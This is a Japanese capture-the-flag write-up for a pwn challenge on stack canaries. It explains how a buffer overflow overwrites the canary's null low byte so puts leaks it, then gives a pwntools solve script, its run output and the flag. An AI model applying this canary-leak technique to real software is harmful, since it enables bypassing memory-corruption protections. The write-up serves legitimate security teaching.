# canary leak : pwn

canaryをleakするだけの問題を作成しました。  
stack smashingは、関数のエピローグに正しいものと比較する部分があり、そこで検知されます。

## Challenge
stack smashingっていつ検出されるんだろう？ ꜀(^｡｡^꜀ )꜆੭

`nc 34.170.146.252 53934`

Attachment: canary-leak.tar.gz

Difficulty: medium  
Topic : Stack Canary  

## writeup
canaryはrbp-0x8のところにあります。  
また、canaryは最下位byteが必ず0x00になるという特徴があります。  
putsはnull終端するまで文字列を出力するので、以下の部分のstack buffer overflowを利用して、canaryの最下位byteを0x00以外に上書きすることで、canaryをleakします。
```c
    read(0, buf, 0xcf);
```
ここで、bufからcanaryまでのoffsetを求めます。
以下の部分で、bufからoffsetが0xc8のところから8bytes分の値を最終的にcanary_savedという変数に代入しています。このことから、canaryはbufから0xc8のところにあると分かります。
```c
    canary = (unsigned long *)(buf + 0xc8);
    canary_saved = *canary;
```
objdumpをすると、bufがrbp-0xd0の部分にあると分かるので、差分をとってoffsetが0xc8だと求めることもできます。


最初のreadで0xc9のpaddingを書き込むことで、putsでcanaryが出力されるので、これを取得します。  
さらに、canaryをleakするために上書きした最下位byteを0x00に戻します。

2回目のreadで、canaryを尋ねられるので、取得・復元したcanaryを入力するとflagが出力されます。

以下、実行コード。
```python
from pwn import *

p = remote("34.170.146.252", 53934)

p.sendafter(b"Input:\n", b"a"*0xc9)

p.recvuntil(b"Output:\n")
p.recvuntil(b"a"*0xc8)
canary = u64(p.recvline().strip()[:8])
log.info(hex(canary))
canary = canary & 0xffffffffffffff00
log.info(hex(canary))

p.sendafter(b"Canary?\n", p64(canary))

p.interactive()
```

```
$ python3 solve.py
[+] Opening connection to 34.170.146.252 on port 53934: Done
[*] 0x5b18baa043d5ad61
[*] 0x5b18baa043d5ad00
[*] Switching to interactive mode
Alpaca{****stack_sm4sh1ng_det3cted****}
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 53934
[*] Got EOF while sending in interactive
```

## flag

`Alpaca{****stack_sm4sh1ng_det3cted****}`